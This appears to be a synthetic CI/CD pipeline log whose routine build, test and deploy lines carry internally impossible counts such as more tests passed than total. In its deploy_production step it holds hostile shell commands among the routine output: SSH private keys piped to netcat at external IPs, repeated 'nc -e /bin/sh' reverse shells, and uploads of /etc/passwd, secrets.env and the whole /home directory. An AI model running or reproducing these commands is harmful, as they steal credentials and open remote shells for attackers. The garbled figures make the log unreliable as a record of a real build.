(47 files)\n[12:19:25] INFO: Cache refreshed\n[12:19:25] WARN: Deprecated API usage\nCompiling lib/utils.go...\nArtifact uploaded: dist.zip (98MB)\n[12:19:25] DEBUG: Query executed in 18ms\nImage pulled successfully\npip: Installing build dependencies...\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\nWARNING: react has known vulnerabilities\nChecking out main branch\nStep 8/15: Building\n\u2713 All checks passed\nVerifying...\nCompiling components/handler.rs...\nCache miss for key-5460\nGenerating source maps...\nException: RuntimeError\nLayer 4/12: COPY command\nMinifying vendor.js\npip install: Successfully installed prettier-2.2\nNODE_ENV=test\nTime: 6.866s\nOK\nTests: 209 passed, 132 total\nLayer 8/14: COPY command\nException: ValueError\nSwitched to branch 'feature/task-676'\nOptimizing 15 modules...\nnpm install: added 455 packages\nArtifact uploaded: dist.zip (82MB)\npip: Downloading axios-1.19.tar.gz\nBuilding Docker image...\nInstalling eslint@3.5.2\nEnvironment: development\n[12:19:25] WARN: Deprecated API usage\nReady.\n\u2713 Step 'build' succeeded\nUsing Python 3.9\n[12:19:25] ERROR: Connection failed\n\u2713 All checks passed\nLayer 9/14: ENV command\nWARNING: prettier has known vulnerabilities\nStep 4/17: Deploying\nnpm install: resolved 675 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (336MB)\nWaiting...\nCache restored successfully (252MB)\nCoverage: 92% statements, 89% branches\nSnapshots: 27 passed, 25 total\n\u2713 build completed\nEnvironment: staging\nUsing Python 3.9\nReady.\nSnapshots: 22 passed, 9 total\nTLS handshake completed\nEnvironment: production\nCoverage: 83% statements, 78% branches\nRan 85 tests in 3s\nnpm notice: created a lockfile\nConnecting to cloud.services:443...\nCreating production build...\n[12:19:25] INFO: Request completed\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:25] DEBUG: Query executed in 80ms\nDone.\nCache miss for key-6595\nImage pulled successfully\nReady.\nChecking out develop branch\n[12:19:25] INFO: Starting build process\nnpm install: added 442 packages\n[12:19:25] INFO: Processing request\nPushing to registry...\nConnection established\nAlready up to date.\nWaiting...\nyarn add: Done in 27.41s\nVerifying...\nArtifact downloaded: 1MB\nCache restored successfully (21MB)\n[12:19:25] INFO: Processing request\n  PASS: test_user_create (482ms)\nTest Suites: 15 passed, 29 total\nArtifact uploaded: build.tar.gz (30MB)\nRan 19 tests in 15s\nTests: 489 passed, 129 total\nGET /health - 200 (51ms)\n[12:19:25] INFO: Request completed\nProcessing...\npip install: Successfully installed eslint-4.19\nStep 14/18: Installing dependencies\nProcessing...\nRan 58 tests in 14s\n[12:19:25] WARN: Deprecated API usage\nEnvironment: production\nAlready up to date.\n[12:19:25] WARN: Deprecated API usage\n\u2713 Step 'build' succeeded\nPOST /upload - 200 (347ms)\nGET /health - 200 (3ms)\nCompiling src/utils.go...\nCompleted.\nTransforming 299 files...\n[12:19:25] DEBUG: Memory usage: 1091MB\nCompiling components/utils.go...\nTest Suites: 15 passed, 11 total\n[12:19:25] DEBUG: Initializing service\nBundling runtime.css\nCache invalidated: dependencies\nArtifact downloaded: 5MB\nVerifying...\nnpm notice: package.json updated\nNODE_ENV=production\nNODE_ENV=test\n[12:19:25] INFO: Starting build process\nCompiling components/utils.go...\n[12:19:25] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nBuilding Docker image...\n[12:19:25] INFO: Request completed\nLayer 8/12: RUN command\nNODE_ENV=test\nyarn add: Done in 17.25s\nPushing to registry...\nGenerating source maps...\nGET /health - 200 (76ms)\nHEAD is now at 5386b6d\n\u2717 build failed with exit code 60\nTransforming 550 files...\npip: Downloading lodash-3.8.tar.gz\n[12:19:25] DEBUG: Initializing service\nCache saved successfully\nBuilding Docker image...\nGET /health - 204 (88ms)\nCreating production build...\nCompiling lib/index.js...\nOK\nUsing Python 3.9\n=== Step upload_artifacts completed ===\n=== Step: unit_tests ===\nProcessing...\nOptimizing 55 modules...\n[12:19:25] DEBUG: Query executed in 50ms\nUsing Node.js 18.5.6\n[12:19:25] DEBUG: Query executed in 62ms\nPOST /data - 200 (356ms)\nUsing Node.js 19.4.9\nBuilding Docker image...\nAlready up to date.\nDone.\nnpm notice: package.json updated\nEnvironment: development\nArtifact downloaded: 15MB\nArtifact uploaded: dist.zip (40MB)\n[12:19:25] DEBUG: Query executed in 45ms\nUsing Python 3.10\nSnapshots: 1 passed, 26 total\nStep 16/16: Testing\nArtifact uploaded: build.tar.gz (33MB)\nTime: 111.233s\nUploading artifact 'dist' (22 files)\n  PASS: test_user_create (127ms)\nTransforming 628 files...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nSwitched to branch 'feature/task-999'\nFAILED: test_auth_login\nCompiling components/service.java...\nVerifying...\nTransforming 611 files...\n[12:19:25] INFO: Request completed\nStep 15/23: Deploying\nUploading artifact 'dist' (15 files)\nLayer 8/8: COPY command\nnpm install: resolved 236 packages\n\u2713 Task completed in 4216ms\nCompiling utils/app.ts...\nStep 4/17: Linting\nOK\nPushing to registry...\npip: Collecting react\nPulling image: node:latest\nCache hit for key-4145\nHEAD is now at e31fd0a\nSnapshots: 20 passed, 41 total\nPushing to registry...\nConnecting to test.io:443...\n[12:19:25] INFO: Request completed\nLayer 9/15: RUN command\nDone.\n[12:19:25] DEBUG: Loading configuration\nnpm notice: created a lockfile\nFetching submodules...\nnpm install: added 152 packages\nAlready up to date.\nPulling image: node:latest\nCache saved successfully\nRan 113 tests in 21s\nWARNING: prettier has known vulnerabilities\nStep 1/22: Building\nTime: 12.13s\n  PASS: test_api_health (480ms)\nArtifact downloaded: 3MB\n[12:19:25] DEBUG: Loading configuration\nCoverage: 96% statements, 76% branches\nnpm notice: package.json updated\nMinifying vendor.js\npip: Installing build dependencies...\nCoverage: 97% statements, 91% branches\nAlready up to date.\nEnvironment: staging\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling vendor.js\nWARNING: eslint has known vulnerabilities\npip install: Successfully installed webpack-2.16\nArtifact uploaded: dist.zip (37MB)\nCompiling utils/index.js...\nSnapshots: 36 passed, 33 total\nCache miss for key-2684\nPulling image: node:latest\nCreating production build...\nProcessing...\n[12:19:25] INFO: Request completed\n\u2713 Task completed in 1023ms\n[12:19:25] ERROR: Connection failed\n[12:19:25] ERROR: Connection failed\nGenerating source maps...\n  PASS: test_db_connect (162ms)\nBundling styles.css\nReady.\npip: Installing build dependencies...\nStep 7/25: Installing dependencies\n\u2717 build failed with exit code 73\nProcessing...\nGET /status - 200 (90ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at 02464b6\n  PASS: test_auth_login (315ms)\n[12:19:25] WARN: Deprecated API usage\n[12:19:25] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\n[12:19:25] INFO: Cache refreshed\nConnecting to test.io:443...\nOptimizing 43 modules...\n[12:19:25] DEBUG: Loading configuration\nyarn add: Done in 15.84s\nArtifact downloaded: 9MB\nFinished.\nConnecting to startup.dev:443...\nNODE_ENV=development\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:25] WARN: Deprecated API usage\nSnapshots: 28 passed, 49 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nDone.\nBuilding Docker image...\nDone.\npip: Collecting react\nPlatform: linux-x64\nTLS handshake completed\nOptimizing 59 modules...\nPlatform: darwin-arm64\n\u2713 All checks passed\nGET /health - 204 (34ms)\nFinished.\nCoverage: 93% statements, 70% branches\nGenerating source maps...\nWaiting...\nStep 17/22: Installing dependencies\n=== Step unit_tests completed ===\n=== Step: setup_environment ===\nCoverage: 77% statements, 75% branches\nPushing to registry...\nWARNING: lodash has known vulnerabilities\nBundling styles.css\nnpm notice: package.json updated\nNODE_ENV=test\nTransforming 990 files...\nImage pulled successfully\n[12:19:25] DEBUG: Memory usage: 1761MB\nPlatform: win32-x64\nCache invalidated: build\nLayer 2/10: ENV command\nImage pulled successfully\npip: Installing build dependencies...\nWARNING: eslint has known vulnerabilities\nUploading artifact 'dist' (43 files)\nCompiling src/index.js...\nCompiling utils/main.py...\n[12:19:25] DEBUG: Initializing service\nCache restored successfully (97MB)\nBuilding Docker image...\nLoading...\nFetching submodules...\n\u2713 Step 'install' succeeded\nGET /api - 201 (46ms)\nGET /api - 204 (98ms)\nCompiling components/index.js...\nCoverage: 88% statements, 75% branches\n[12:19:25] DEBUG: Loading configuration\nRan 158 tests in 19s\npip: Collecting webpack\nArtifact uploaded: dist.zip (33MB)\nnpm notice: package.json updated\n[12:19:25] ERROR: Connection failed\nLoading...\nTest Suites: 30 passed, 28 total\n[12:19:25] WARN: Deprecated API usage\nUploading artifact 'coverage' (24 files)\nnpm notice: package.json updated\nReady.\nCompiling lib/app.ts...\nPlatform: linux-x64\nTest Suites: 31 passed, 38 total\nWARNING: lodash has known vulnerabilities\n[12:19:25] DEBUG: Initializing service\nReady.\n[12:19:25] DEBUG: Memory usage: 197MB\nFinished.\nDone.\nCompiling utils/app.ts...\nnpm install: added 300 packages\nGenerating source maps...\npip install: Successfully installed jest-4.1\nCache miss for key-2402\nChecking out main branch\nCompleted.\nSnapshots: 13 passed, 46 total\nWARNING: eslint has known vulnerabilities\nPushing to registry...\nUsing Python 3.11\n\u2713 All checks passed\nLayer 8/10: RUN command\nConnection established\npip install: Successfully installed prettier-4.20\nTests: 65 passed, 339 total\nyarn add: Done in 13.39s\n[12:19:25] INFO: Starting build process\npip: Installing build dependencies...\nPlatform: darwin-arm64\nCompiling utils/service.java...\nPushing to registry...\n  PASS: unit/test_api_health.spec.js\nArtifact downloaded: 44MB\nStep 5/18: Building\nChecking out main branch\n[12:19:25] INFO: Starting build process\nUsing Python 3.11\nConnection established\nVerifying...\nCompiling src/app.ts...\nStep 2/22: Linting\nyarn add: Done in 5.65s\nUsing Python 3.9\n[12:19:25] DEBUG: Loading configuration\n[12:19:25] DEBUG: Initializing service\nException: RuntimeError\nCompleted.\nTest Suites: 10 passed, 26 total\nTransforming 161 files...\nHEAD is now at 6c04ef1\nStep 19/25: Building\nTLS handshake completed\nCompiling utils/utils.go...\nCompleted.\n[12:19:25] INFO: Cache refreshed\n[12:19:25] INFO: Starting build process\n[12:19:25] DEBUG: Initializing service\nConnecting to test.io:443...\nStep 19/17: Running migrations\nCompiling src/handler.rs...\nImage pulled successfully\n\u2713 All checks passed\nGET /status - 204 (44ms)\nCache miss for key-4378\nVerifying...\n[12:19:25] DEBUG: Initializing service\npip: Installing build dependencies...\n\u2713 Task completed in 3227ms\nGET /status - 204 (62ms)\npip: Downloading eslint-5.18.tar.gz\npip: Downloading express-4.4.tar.gz\nFAILED: test_cache_hit\nStep 11/21: Testing\nWARNING: prettier has known vulnerabilities\n  PASS: unit/test_auth_login.spec.js\n[12:19:25] WARN: Deprecated API usage\nSuccess!\n[12:19:25] DEBUG: Initializing service\nUsing Python 3.12\nArtifact downloaded: 7MB\nRan 63 tests in 23s\nWaiting...\nCompleted.\nCache invalidated: build\nCache invalidated: node_modules\nCreating production build...\nUsing Node.js 19.7.8\n[12:19:25] DEBUG: Connection pool: 5 active\nNODE_ENV=production\n[12:19:25] DEBUG: Initializing service\nLoading...\nNODE_ENV=development\n=== Step setup_environment completed ===\n=== Step: save_cache ===\nCache restored successfully (273MB)\nTest Suites: 12 passed, 10 total\nArtifact downloaded: 45MB\n  PASS: unit/test_db_connect.spec.js\nArtifact uploaded: dist.zip (55MB)\n[12:19:25] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (6MB)\nyarn add: Done in 7.46s\n[12:19:25] DEBUG: Initializing service\n  PASS: unit/test_api_health.spec.js\npip install: Successfully installed prettier-4.6\nEnvironment: development\nStep 3/18: Building\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompleted.\nArtifact uploaded: dist.zip (60MB)\nStep 10/25: Building\n[12:19:25] DEBUG: Connection pool: 10 active\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 17.15.2\n[12:19:25] WARN: Deprecated API usage\n\u2713 lint completed\nStep 2/23: Building\nTests: 309 passed, 162 total\nCompiling components/handler.rs...\n[12:19:25] DEBUG: Initializing service\nOptimizing 89 modules...\nTests: 420 passed, 481 total\nNODE_ENV=development\nHEAD is now at 292fcb7\nPlatform: linux-x64\nSwitched to branch 'feature/task-285'\nUsing Python 3.11\nPlatform: linux-x64\nPushing to registry...\nWaiting...\n[12:19:25] DEBUG: Initializing service\nStep 3/16: Building\nLoading...\nTest Suites: 29 passed, 23 total\nLoading...\nnpm notice: package.json updated\nImage pulled successfully\nArtifact uploaded: dist.zip (48MB)\nCompiling lib/main.py...\nUploading artifact 'coverage' (22 files)\nLayer 10/14: COPY command\nRan 69 tests in 30s\n[12:19:25] DEBUG: Initializing service\n  PASS: integration/test_auth_login.spec.js\nyarn add: Done in 14.54s\nHEAD is now at 393116f\nConnecting to cloud.services:443...\nFinished.\nnpm install: added 444 packages\nGET /status - 204 (85ms)\nnpm notice: created a lockfile\nSnapshots: 26 passed, 24 total\nNODE_ENV=production\nStep 4/20: Building\nWaiting...\nWARNING: eslint has known vulnerabilities\nOK\nCreating production build...\nImage pulled successfully\nArtifact uploaded: dist.zip (100MB)\nStep 9/15: Running migrations\nWARNING: webpack has known vulnerabilities\nImage pulled successfully\nStep 3/16: Running migrations\nCache miss for key-5008\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: TypeError\nPlatform: linux-x64\nStep 15/16: Installing dependencies\nFetching submodules...\nnpm notice: created a lockfile\nnpm install: resolved 636 packages\nnpm install: added 22 packages\nArtifact uploaded: build.tar.gz (4MB)\npip install: Successfully installed lodash-4.9\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nStep 5/17: Testing\nFAILED: test_cache_hit\n[12:19:25] ERROR: Connection failed\nnpm install: added 192 packages\nCache saved successfully\nSnapshots: 35 passed, 47 total\npip: Downloading lodash-1.13.tar.gz\nUploading artifact 'coverage' (35 files)\nCompiling utils/utils.go...\nStep 6/18: Linting\nPulling image: node:18\n[12:19:25] WARN: Deprecated API usage\n[12:19:25] DEBUG: Loading configuration\n[12:19:25] WARN: Deprecated API usage\n[12:19:25] INFO: Processing request\n\u2713 Step 'setup' succeeded\n[12:19:25] DEBUG: Initializing service\nArtifact uploaded: dist.zip (48MB)\nInstalling axios@3.7.10\nnpm notice: package.json updated\n\u2713 Task completed in 1171ms\n\u2713 All checks passed\nnpm notice: created a lockfile\n[12:19:25] INFO: Processing request\nConnecting to startup.dev:443...\nStep 7/17: Testing\nUploading artifact 'dist' (35 files)\nUsing Python 3.10\n[12:19:25] INFO: Connecting to database\nnpm notice: package.json updated\n\u2713 All checks passed\n  PASS: e2e/test_cache_hit.spec.js\n[12:19:25] INFO: Connecting to database\n[12:19:25] INFO: Connecting to database\nnpm notice: created a lockfile\nPushing to registry...\nnpm install: resolved 933 packages\nStep 7/21: Linting\nGenerating source maps...\nCompleted.\nCoverage: 90% statements, 74% branches\nyarn add: Done in 12.80s\nConnecting to cloud.services:443...\nTLS handshake completed\nCompiling lib/utils.go...\nArtifact uploaded: build.tar.gz (31MB)\nVerifying...\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\nyarn add: Done in 22.27s\nVerifying...\nPOST /api - 201 (214ms)\nArtifact uploaded: dist.zip (84MB)\nInstalling express@4.5.6\nnpm install: added 177 packages\nCompiling src/index.js...\nConnection established\n[12:19:25] DEBUG: Memory usage: 1874MB\nBuilding Docker image...\nTLS handshake completed\nLayer 1/10: COPY command\n  PASS: e2e/test_db_connect.spec.js\nCache saved successfully\n\u2713 validate completed\nStep 3/16: Running migrations\nPlatform: darwin-arm64\nBuilding Docker image...\npip: Downloading express-4.0.tar.gz\nTests: 354 passed, 413 total\nFAILED: test_cache_hit\nStep 12/19: Running migrations\nPulling image: alpine:18\npip: Installing build dependencies...\nConnecting to example.com:443...\nStep 11/24: Deploying\nSwitched to branch 'hotfix/task-623'\nCompiling utils/app.ts...\nLoading...\nnpm notice: package.json updated\nTime: 22.123s\n[12:19:25] INFO: Cache refreshed\npip: Downloading eslint-1.14.tar.gz\nProcessing...\nGenerating source maps...\nSwitched to branch 'bugfix/task-838'\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTest Suites: 16 passed, 42 total\n\u2717 build failed with exit code 98\nCompiling lib/handler.rs...\nArtifact downloaded: 47MB\nHEAD is now at fe45388\n[12:19:25] DEBUG: Query executed in 32ms\nStep 11/21: Building\nPOST /upload - 202 (43ms)\nStep 11/24: Running migrations\n[12:19:25] DEBUG: Initializing service\nStep 5/20: Building\nWaiting...\n\u2713 package completed\nWaiting...\nCache invalidated: build\nUsing Node.js 18.20.3\nArtifact uploaded: dist.zip (31MB)\nArtifact uploaded: build.tar.gz (42MB)\nStep 6/25: Building\nPOST /upload - 201 (399ms)\nPushing to registry...\n\u2713 Task completed in 1421ms\nStep 20/16: Building\nPlatform: darwin-arm64\nSwitched to branch 'feature/task-156'\nLayer 1/13: ENV command\n  PASS: test_api_health (452ms)\n[12:19:25] INFO: Starting build process\nOK\nPlatform: linux-x64\nOptimizing 79 modules...\nLayer 6/13: COPY command\nPOST /api - 202 (441ms)\nCompleted.\nPOST /upload - 201 (436ms)\nStep 18/24: Deploying\nCache miss for key-6860\nVerifying...\nWARNING: lodash has known vulnerabilities\nEnvironment: staging\nnpm notice: package.json updated\nUploading artifact 'build' (46 files)\nArtifact uploaded: build.tar.gz (32MB)\n[12:19:25] ERROR: Connection failed\n[12:19:25] DEBUG: Memory usage: 283MB\nWARNING: lodash has known vulnerabilities\nHEAD is now at 5c775de\nLayer 7/13: COPY command\nFetching submodules...\nSwitched to branch 'hotfix/task-110'\nReady.\nBundling styles.js\nLayer 5/13: RUN command\nTLS handshake completed\nCreating production build...\nyarn add: Done in 15.15s\nGenerating source maps...\nSuccess!\n[12:19:25] INFO: Request completed\n[12:19:25] DEBUG: Memory usage: 1039MB\nFetching submodules...\nCache hit for key-6919\n[12:19:25] DEBUG: Query executed in 64ms\n[12:19:25] DEBUG: Loading configuration\nTransforming 607 files...\n  PASS: test_cache_hit (45ms)\n[12:19:25] DEBUG: Initializing service\nStep 14/23: Linting\nStep 2/15: Building\nCache miss for key-4095\n[12:19:25] ERROR: Connection failed\nCompiling components/service.java...\n\u2713 Task completed in 4457ms\n\u2713 Step 'install' succeeded\nCache miss for key-5423\nTLS handshake completed\nProcessing...\npip install: Successfully installed axios-2.1\nTime: 35.452s\n\u2713 All checks passed\n\u2713 Step 'test' succeeded\nTest Suites: 42 passed, 28 total\npip: Installing build dependencies...\nHEAD is now at 3a81e24\nStep 16/24: Deploying\nWARNING: express has known vulnerabilities\nnpm install: added 298 packages\nWARNING: express has known vulnerabilities\nFinished.\n[12:19:25] ERROR: Connection failed\nFinished.\nAlready up to date.\nVerifying...\nStep 14/22: Installing dependencies\nLoading...\n=== Step deploy_staging completed ===\n=== Step: checkout ===\n[12:19:25] WARN: Deprecated API usage\n[12:19:25] INFO: Request completed\nCompiling src/app.ts...\nTests: 462 passed, 344 total\n[12:19:25] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (19MB)\n[12:19:25] WARN: Deprecated API usage\nGET /health - 201 (78ms)\nMinifying vendor.js\n\u2713 Task completed in 4219ms\nArtifact downloaded: 3MB\nUsing Python 3.9\nPlatform: win32-x64\nCompiling lib/app.ts...\nnpm notice: package.json updated\nReady.\nUsing Node.js 18.10.0\n[12:19:25] DEBUG: Query executed in 70ms\nCoverage: 75% statements, 66% branches\nStep 9/21: Linting\n  PASS: integration/test_user_create.spec.js\n  PASS: test_db_connect (71ms)\npip install: Successfully installed webpack-1.0\nSnapshots: 38 passed, 2 total\n[12:19:25] DEBUG: Initializing service\nWaiting...\nCompiling utils/index.js...\nCache restored successfully (370MB)\n\u2717 build failed with exit code 96\nyarn add: Done in 4.10s\n[12:19:25] DEBUG: Connection pool: 16 active\nGenerating source maps...\nUsing Python 3.12\nReady.\nWARNING: eslint has known vulnerabilities\nPushing to registry...\n[12:19:25] DEBUG: Initializing service\nUsing Node.js 19.15.5\nGenerating source maps...\n[12:19:25] INFO: Connecting to database\nReady.\n[12:19:25] INFO: Request completed\nSwitched to branch 'hotfix/task-816'\nFinished.\nInstalling jest@4.13.9\nUsing Python 3.12\nDone.\nBundling main.css\nDone.\nFAILED: test_user_create\nTLS handshake completed\nFinished.\nVerifying...\nMinifying vendor.js\nnpm install: added 48 packages\nCompleted.\nnpm install: added 84 packages\nStep 13/20: Testing\nProcessing...\nTime: 71.509s\n\u2713 Task completed in 3858ms\nWaiting...\n[12:19:25] DEBUG: Initializing service\nUsing Node.js 16.13.8\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPushing to registry...\nConnecting to test.io:443...\nTLS handshake completed\nnpm notice: package.json updated\npip: Installing build dependencies...\nProcessing...\nInstalling jest@3.5.2\n[12:19:25] INFO: Cache refreshed\n[12:19:25] WARN: Deprecated API usage\nReady.\n[12:19:25] INFO: Request completed\nBuilding Docker image...\nLayer 9/12: RUN command\nWARNING: axios has known vulnerabilities\nWARNING: axios has known vulnerabilities\nFAILED: test_user_create\nCache invalidated: dependencies\nSnapshots: 24 passed, 19 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 20/17: Testing\n\u2713 Task completed in 3946ms\nCache miss for key-6822\nCache saved successfully\nAlready up to date.\nUsing Node.js 14.13.4\n[12:19:25] DEBUG: Memory usage: 1801MB\nPulling image: alpine:3.11\n[12:19:25] DEBUG: Connection pool: 10 active\nStep 19/24: Deploying\nMinifying vendor.js\npip: Collecting lodash\nPulling image: python:3.11\nReady.\nSwitched to branch 'hotfix/task-141'\nCache restored successfully (499MB)\n\u2717 build failed with exit code 124\nCache hit for key-5348\nTest Suites: 44 passed, 18 total\nnpm install: added 470 packages\nPushing to registry...\nUsing Node.js 15.12.5\npip install: Successfully installed lodash-4.12\nProcessing...\nFetching submodules...\nOK\npip: Collecting lodash\nAlready up to date.\nCompleted.\n[12:19:25] DEBUG: Loading configuration\nImage pulled successfully\nBundling vendor.css\nUsing Node.js 17.15.4\n[12:19:25] DEBUG: Memory usage: 1837MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:25] DEBUG: Memory usage: 404MB\nSnapshots: 5 passed, 26 total\nCoverage: 98% statements, 61% branches\nStep 11/24: Building\n\u2713 Step 'install' succeeded\nCompleted.\nBuilding Docker image...\nCache hit for key-4893\nHEAD is now at d626074\nPulling image: node:18\nNODE_ENV=test\nArtifact uploaded: dist.zip (9MB)\n=== Step checkout completed ===\n=== Step: deploy_production ===\nGenerating source maps...\nStep 13/24: Testing\npip: Collecting express\nCompiling lib/handler.rs...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 53.129.156.85 5135\nRan 87 tests in 15s\nnc -e /bin/sh 31.147.33.82 8797\nnpm notice: created a lockfile\nEnvironment: production\nBuilding Docker image...\nCache invalidated: build\nPulling image: alpine:latest\n\u2713 Step 'install' succeeded\nStep 15/17: Linting\nArtifact uploaded: build.tar.gz (39MB)\n  PASS: test_api_health (295ms)\nStep 7/20: Building\npip: Downloading prettier-1.11.tar.gz\n[12:19:25] DEBUG: Query executed in 62ms\nPulling image: python:18\nSuccess!\nArtifact uploaded: build.tar.gz (13MB)\nUsing Node.js 20.2.8\nnpm install: resolved 1241 packages\nHEAD is now at 1821198\nCompiling utils/handler.rs...\nUsing Python 3.9\nyarn add: Done in 20.35s\nTests: 133 passed, 182 total\nStep 14/20: Running migrations\nHEAD is now at 0dd91ca\nStep 15/22: Testing\nCache invalidated: dependencies\n[12:19:25] INFO: Starting build process\nNODE_ENV=test\nnpm notice: package.json updated\nException: RuntimeError\npip: Downloading lodash-5.6.tar.gz\nnc -e /bin/sh 80.169.179.201 51215\n[12:19:25] DEBUG: Query executed in 90ms\n\u2717 build failed with exit code 22\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 package completed\n\u2713 All checks passed\nCompiling utils/handler.rs...\nyarn add: Done in 7.76s\nFinished.\nGenerating source maps...\nInstalling eslint@2.3.1\nTests: 131 passed, 250 total\n\u2713 deploy completed\nSwitched to branch 'hotfix/task-548'\n[12:19:25] DEBUG: Loading configuration\nGET /api - 201 (8ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\nnpm install: added 408 packages\nWaiting...\nImage pulled successfully\nOptimizing 78 modules...\nSending 353MB of data to example.com\nArtifact downloaded: 35MB\nCache hit for key-6117\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nUsing Node.js 20.13.9\nCache hit for key-2269\nStep 6/17: Building\nWaiting...\npip: Installing build dependencies...\n[12:19:25] INFO: Starting build process\nnpm notice: package.json updated\nFetching submodules...\nStep 7/21: Building\nTime: 107.742s\nException: NullPointerException\npip: Collecting express\ncurl -X POST https://cloud.services/collect -d @secrets.env\nChecking out main branch\nnc -e /bin/sh 95.197.110.118 31680\nPulling image: node:latest\nProcessing...\n[12:19:25] INFO: Starting build process\npip: Downloading axios-3.0.tar.gz\n[12:19:25] WARN: Deprecated API usage\nCompleted.\nCache hit for key-2006\n[12:19:25] INFO: Processing request\nOK\nCache invalidated: dependencies\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:25] WARN: Deprecated API usage\nRan 196 tests in 43s\nLoading...\n[12:19:25] INFO: Connecting to database\n\u2713 build completed\nStep 4/19: Building\npip: Downloading jest-5.16.tar.gz\nStep 2/16: Running migrations\n[12:19:25] DEBUG: Initializing service\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nVerifying...\nAlready up to date.\nSending 372MB of data to example.com\nEnvironment: production\nSuccess!\nStep 1/21: Deploying\nnc -e /bin/sh 108.236.98.187 10003\nArtifact downloaded: 45MB\nConnecting to cloud.services:443...\n[12:19:25] INFO: Cache refreshed\nSwitched to branch 'hotfix/task-213'\nNODE_ENV=test\n[12:19:25] WARN: Deprecated API usage\nEnvironment: production\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nOK\nSnapshots: 10 passed, 8 total\necho $(cat ~/.ssh/id_rsa) | base64 | nc 64.153.2.9 5378\nUsing Python 3.10\nReady.\nUsing Node.js 14.15.1\nCache hit for key-3850\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPushing to registry...\nLayer 9/14: RUN command\nnc -e /bin/sh 162.226.31.162 53226\nChecking out develop branch\nCache saved successfully\nLayer 7/10: ENV command\nCache miss for key-3459\nyarn add: Done in 26.16s\nPulling image: python:18\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nnc -e /bin/sh 219.56.228.200 1929\nSnapshots: 32 passed, 13 total\n[12:19:25] WARN: Deprecated API usage\nBuilding Docker image...\nWaiting...\n[12:19:25] DEBUG: Connection pool: 11 active\nStep 7/20: Installing dependencies\nGenerating source maps...\nNODE_ENV=production\nSending 79MB of data to acme.corp\nPOST /data - 200 (256ms)\n[12:19:25] WARN: Deprecated API usage\n[12:19:25] INFO: Request completed\nnc -e /bin/sh 205.36.132.236 18966\nCache miss for key-7809\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-07T12:19:25.622736",
        "finished_at": "2025-12-07T12:19:36.297717",
        "log_lines": [
          "=== Step: lint ===",
          "Bundling main.css",
          "[12:19:25] INFO: Cache refreshed",
          "Cache restored successfully (135MB)",
          "Cache saved successfully",
          "  PASS: integration/test_auth_login.spec.js",
          "pip: Collecting webpack",
          "Loading...",
          "Installing axios@2.14.8",
          "Compiling src/handler.rs...",
          "Coverage: 81% statements, 72% branches",
          "\u2713 All checks passed",
          "Already up to date.",
          "Step 1/20: Linting",
          "pip install: Successfully installed eslint-4.19",
          "TLS handshake completed",
          "Checking out master branch",
          "Fetching submodules...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pushing to registry...",
          "Pushing to registry...",
          "[12:19:25] INFO: Cache refreshed",
          "Ready.",
          "Finished.",
          "Using Python 3.12",
          "Layer 8/13: COPY command",
          "Platform: darwin-arm64",
          "GET /health - 200 (52ms)",
          "Ran 177 tests in 45s",
          "Connecting to test.io:443...",
          "pip: Collecting jest",
          "[12:19:25] DEBUG: Query executed in 71ms",
          "WARNING: webpack has known vulnerabilities",
          "Checking out main branch",
          "Cache saved successfully",
          "[12:19:25] INFO: Request completed",
          "\u2713 All checks passed",
          "Already up to date.",
          "Optimizing 57 modules...",
          "Compiling src/handler.rs...",
          "GET /api - 200 (43ms)",
          "Generating source maps...",
          "Compiling src/main.py...",
          "Checking out develop branch",
          "[12:19:25] INFO: Starting build process",
          "TLS handshake completed",
          "Using Node.js 17.9.9",
          "Building Docker image...",
          "POST /upload - 200 (492ms)",
          "[12:19:25] INFO: Request completed",
          "HEAD is now at 8bf2cf6",
          "Switched to branch 'feature/task-243'",
          "npm notice: created a lockfile",
          "Cache invalidated: node_modules",
          "[12:19:25] INFO: Connecting to database",
          "Cache saved successfully",
          "Cache invalidated: dependencies",
          "WARNING: axios has known vulnerabilities",
          "Cache restored successfully (189MB)",
          "[12:19:25] DEBUG: Query executed in 56ms",
          "[12:19:25] INFO: Starting build process",
          "Cache saved successfully",
          "NODE_ENV=production",
          "Minifying main.js",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "[12:19:25] WARN: Deprecated API usage",
          "Connecting to startup.dev:443...",
          "\u2713 All checks passed",
          "Ran 109 tests in 42s",
          "yarn add: Done in 30.51s",
          "Step 2/22: Running migrations",
          "Optimizing 65 modules...",
          "Step 1/25: Linting",
          "Cache hit for key-3815",
